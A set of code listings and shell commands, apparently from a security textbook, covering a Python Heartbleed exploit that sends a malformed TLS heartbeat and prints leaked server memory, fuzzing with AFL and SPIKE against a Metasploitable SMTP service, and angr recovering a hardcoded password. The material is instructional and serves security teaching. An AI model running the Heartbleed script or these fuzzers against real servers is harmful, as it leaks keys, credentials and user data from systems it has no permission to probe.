["```\nimport sys\nimport socket\nimport struct\nimport select\nimport array\n```", "```\nclientHello = (\n\n    0x16,             # Type: Handshake record\n\n    0x03, 0x03,       # TLS Version : Version 1.2\n\n    0x00, 0x2f,       # Packet Length : 47 bytes\n\n    0x01,             # Message Type: Client Hello\n\n    0x00, 0x00, 0x2b, # Message Length : 43 bytes to follow\n\n    0x03, 0x03,       # Client TLS Version: Client support version 1.2\n\n                      # Client Random  (Nonce)\n\n    0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f, 0x10, 0x11, 0x00, 0x01,\n\n    0x02, 0x19, 0x1a, 0x1b, 0x1c, 0x1d, 0x1e, 0x1f, 0x03, 0x04,\n\n    0x05, 0x06, 0x07, 0x08, 0x09, 0x12, 0x13, 0x14, 0x15, 0x16,\n\n    0x17, 0x18,\n\n    0x00,             # Session ID Length\n\n    0x00, 0x02,       # Cipher Suite Length: 2 bytes\n\n    0x00, 0x2f,       # Cipher Suite - TLS_RSA_WITH_AES_128_CBC_SHA\n\n    0x01, 0x00,       # Compression: length 0x1 byte & 0x00 (no compression)\n\n    0x00, 0x00,       # Extension Length: 0, No extensions\n\n)\n```", "```\nSERVER_HELLO_DONE = 14 #0x0e\n```", "```\ndef recv_all(socket, length):\n\n    response = b''\n\n    total_bytes_remaining = length\n\n    while total_bytes_remaining > 0:\n\n     ➊ readable, writeable, error = select.select([socket], [], [])\n\n        if socket in readable:\n\n         ➋ data = socket.recv(total_bytes_remaining)\n\n            response += data\n\n            total_bytes_remaining -= len(data)\n\n   return response\n```", "```\ndef readPacket(socket):\n\n    headerLength = 6\n\n    payload = b''\n\n  ➊ header =  recv_all(socket, headerLength)\n\n    print(header.hex(\" \"))\n\n    if header != b'':\n\n     ➋ type, version, length, msgType = struct.unpack('>BHHB',header)\n\n        if length > 0:\n\n         ➌ payload +=  recv_all(socket,length 1)\n\n    else:\n\n        print(\"Response has no header\")\n\n    return type, version,  payload, msgType\n```", "```\nheartbeat = (\n\n     0x18,        # Type: Heartbeat Message\n\n     0x03, 0x03,  # TLS Version : Version 1.2\n\n  ➊ 0x00, 0x03,  # Packet Length : 3 bytes\n\n     0x01,        # Heartbeat Request\n\n  ➋ 0x00, 0x40   # Payload length 64KB\n\n                 )\n```", "```\ndef readServerHeartBeat(socket):\n\n    payload  = b''\n\n    for i in range(0, 4):\n\n     ➊ type, version, packet_payload, msgType =  readPacket(socket)\n\n     ➋ payload += packet_payload\n\n    return (type, version,  payload, msgType)\n```", "```\ndef exploit(socket):\n➊ HEART_BEAT_RESPONSE = 21 #0x15\n\n   payload = b''\n➋ socket.send(array.array('B', heartbeat))\n\n   print(\"Sent Heartbeat \")\n➌ type, version, payload, msgType = readServerHeartBeat(socket)\n\n   if type is not None:\n\n      if msgType ==  HEART_BEAT_RESPONSE :\n\n        ➍ print(payload.decode('utf-8'))\n\n    else:\n\n        print(\"No heartbeat received\")\n\n    socket.close()\n```", "```\ndef main():\n\n     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n  ➊ s.connect((sys.argv[1], 443))\n\n  ➋ s.send(array.array('B',clientHello))\n\n     serverHelloDone = False\n\n  ➌ while not serverHelloDone:\n\n        type, version, payload, msgType  = readPacket(s)\n\n        if (msgType == SERVER_HELLO_DONE):\n\n            serverHelloDone = True\n\n  ➍ exploit(s)\nif __name__ == '__main__':\n\n    main()\n```", "```\ndef testFunction(a,b,c):\n\n   x, y, z = 0, 0, 0\n\n   if (a):\n\n       x = -2\n\n   if (b < 5):\n\n      if (not a and c):\n\n         y = 1\n\n      z = 2\n\n   assert(x + y + z != 3)\n```", "```\n   import random as rand\n\n   import sys\n\n   #-----------------------------------------\n➊ #    Place Test function here\n\n   #-----------------------------------------\n\n   def main():\n\n      while True:\n\n       ➋ a = rand.randint(-200, 200)\n\n          b = rand.randint(-200, 200)\n\n          c = rand.randint(-200, 200)\n\n          print(a,b,c)\n\n          testFunction(a,b,c)\n\nif __name__ == \"__main__\":\n\n    main()\n```", "```\nkali@kali:~$ python3 myFuzzer.py\n```", "```\nkali@kali:~$ git clone https://github.com/google/AFL.git\n```", "```\nkali@kali:~$ cd AFL\n```", "```\nkali@kali:~/AFL$ make && sudo make install\n```", "```\nkali@kali:~/AFL$ sudo apt-get install python3-pip\n```", "```\nkali@kali:~/AFL$ sudo pip3 install python-afl\n```", "```\nimport sys\nimport afl\nimport os\n\n#-----------------------------------------\n\n#   Place test function here\n\n#-----------------------------------------\n\ndef main():\n\n ➊ in_str = sys.stdin.read()\n\n ➋ a, b, c = in_str.strip().split(\" \")\n\n    a = int(a)\n\n    b = int(b)\n\n    c = int(c)\n\n    testFunction(a,b,c)\n\nif __name__ == \"__main__\":\n\n ➌ afl.init()\n\n    main()\n\n ➍ os._exit(0)\n```", "```\nkali@kali:~$ cd ~/Desktop/Fuzzer\n```", "```\nkali@kali:~/Desktop/Fuzzer$ echo \"0 10 1\" > TestInput/testInput1.txt\n```", "```\nkali@kali:~/Desktop/Fuzzer$ python3 App/fuzzExample.py < TestInput/testInput1.txt\n```", "```\nkali@kali:~/Desktop/Fuzzer$ echo \"2 5 7\" > TestInput/testInput2.txt\nkali@kali:~/Desktop/Fuzzer$ echo \"10 10 10\" > TestInput/testInput3.txt\n```", "```\npy-afl-fuzz [ options ] -- python3 /path/to/fuzzed_app\n```", "```\nkali@kali:~/Desktop/Fuzzer$ export AFL_NO_FORKSRV=1\n```", "```\nkali@kali:~/Desktop/Fuzzer$ py-afl-fuzz -i TestInput/ -o Results/ -- python3 App/fuzzExample.py\n```", "```\n                    american fuzzy lop 2.57b (python3)\n\n--process timing --------------------------------------overall results ---\n\n|        run time : 0 days, 0 hrs, 0 min, 16 sec       |  cycles done : 0    |\n\n|   last new path : 0 days, 0 hrs, 0 min, 14 sec       |  total paths : 4    |\n\n| last uniq crash : 0 days, 0 hrs, 0 min, 10 sec       | uniq crashes : 5    |\n\n|  last uniq hang : none seen yet                      |   uniq hangs : 0    |\n\n|cycle progress ---------------------map coverage -----------------------|\n\n|  now processing : 1 (25.00%)        |    map density : 0.03% / 0.04%       |\n\n| paths timed out : 0 (0.00%)         | count coverage : 1.00 bits/tuple     |\n\n|stage progress --------------------|findings in depth ------------------|\n\n|  now trying : havoc                 | favored paths : 2 (50.00%)           |\n\n| stage execs : 68/204 (33.33%)       |  new edges on : 3 (75.00%)           |\n\n| total execs : 577                   | total crashes : 505 (5 unique)       |\n|  exec speed : 35.07/sec (slow!)     |  total tmouts : 0 (0 unique)         |\n\n|fuzzing strategy yields -----------------------------path geometry -----|\n\n|   bit flips : 4/32, 1/31, 0/29                      |    levels : 2        |\n\n|  byte flips : 0/4, 0/3, 0/1                         |   pending : 4        |\n\n| arithmetics : 1/222, 0/9, 0/0                       |  pend fav : 2        |\n\n|  known ints : 0/19, 0/81, 0/44                      | own finds : 1        |\n\n|  dictionary : 0/0, 0/0, 0/0                         |  imported : n/a      |\n\n|       havoc : 0/0, 0/0                              | stability : 100.00%  |\n\n|        trim : 20.00%/1, 0.00%                       |----------------------|\n\n| [!] WARNING: error waitpid--------------------------|         [cpu000:103%]\n```", "```\ndef test(x):\n\n    c = q*p #Two large primes.\n\n ➊ if(pow(2,x) % c == 17):\n\n        print(\"Error\")\n\n    else:\n\n        print(\"No Error\")\n```", "```\n#include <stdio.h>\n\nvoid checkPass(int x){\n\n   if(x == 7857){\n\n      printf(\"Access Granted\");\n\n   }else{\n\n      printf(\"Access Denied\");\n\n   }\n\n}\n\nint main(int argc, char *argv[]) {\n\n    int x = 0;  \n\n    printf(\"Enter the password: \");\n\n    scanf(\"%d\", &x);\n\n    checkPass(x);\n\n}\n```", "```\nkali@kali:~$ cd ~/Desktop/Concolic/\n```", "```\nkali@kali:~$ gcc -o simple simple.c\n```", "```\nkali@kali:~$ ./simple\n```", "```\nkali@kali:~$ sudo apt-get install python3-dev libffi-dev build-essential virtualenvwrapper\n```", "```\nkali@kali:~$ source /usr/share/virtualenvwrapper/virtualenvwrapper.sh\n```", "```\nkali@kali:~$ mkvirtualenv --python=$(which python3) angrEnv\n```", "```\nkali@kali:~$ pip3 install angr\n```", "```\n(angrEnv) kali@kali:~/Desktop/Concolic$\n```", "```\n   import angr\n\n   import sys\n➊ project = angr.Project('simple')\n➋ initial_state = project.factory.entry_state()\n\n   simulation = project.factory.simgr(initial_state)\n\n➌ def is_successful(state):\n\n       stdout_output = state.posix.dumps(sys.stdout.fileno())\n\n       return 'Access Granted'in stdout_output.decode(\"utf-8\")\n\n➍ def should_abort(state):\n\n       stdout_output = state.posix.dumps(sys.stdout.fileno())\n\n       return 'Access Denied'in stdout_output.decode(\"utf-8\")\n\n➎ simulation.explore(find=is_successful, avoid=should_abort)\n\n   if simulation.found:\n\n       solution_state = simulation.found[0]\n\n       print(\"Found solution\")\n\n    ➏ print(solution_state.posix.dumps(sys.stdin.fileno()))\nelse:\n\n     raise Exception('Could not find the password')\n```", "```\n(angrEnv) kali@kali:~/Desktop/Concolic$ python3 angrSim.py\n```", "```\nIt is being loaded with a base address of 0x400000.\nFound solution\nb'0000007857'\n```", "```\ngeneric_web_server_fuzz [target-IP] [port] [spikescript] [variable index]    [\n\n\t\t\t strings index]\n```", "```\nkali@kali:~$ generic_web_server_fuzz <Metasploitable IP address> 25 /usr/share\n\n\t\t\t /spike/audits/SMTP/smtp1.spk 0 0\n\nTarget is 192.168.1.101\nTotal Number of Strings is 681\nFuzzing Variable 1:1\nVariablesize= 5004\nRequest:\nHELO /.:/AAAAAAAAAAA\n\n...\n```", "```\n   s_string_variable(\"HELO\");\n\n   s_string(\" \");\n\n   s_string_variable(\"localhost\");\n\n   s_string(\"\\r\\n\");\n\n   //endblock\n➊ s_string(\"MAIL-FROM\");\n\n   s_string(\":\");\n➋ s_string_variable(\"bob\")\n```"]